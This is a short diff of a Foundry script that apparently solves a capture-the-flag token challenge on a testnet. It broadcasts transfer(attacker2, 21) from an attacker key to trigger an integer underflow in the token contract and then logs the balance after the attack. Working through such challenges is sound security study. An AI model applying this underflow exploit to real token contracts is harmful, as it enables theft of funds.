@@ -20,10 +20,10 @@ contract TokenScript is Script {
         address attacker2 = vm.envAddress("TESTNET_ADDRESS_2");
 
         vm.startBroadcast(attackerKey);
-        token.transfer(
-            attacker2,
-            (type(uint).max -
-                115792089237316195423570985008687907853269984665640564039457584007913129639135)
+        token.transfer(attacker2, 21);
+        console.log(
+            "Balance after attack : ",
+            token.balanceOf(vm.envAddress("TESTNET_ADDRESS_1"))
         );
         vm.stopBroadcast();
         console.log("SUCCESS!!! Submit the instance.");
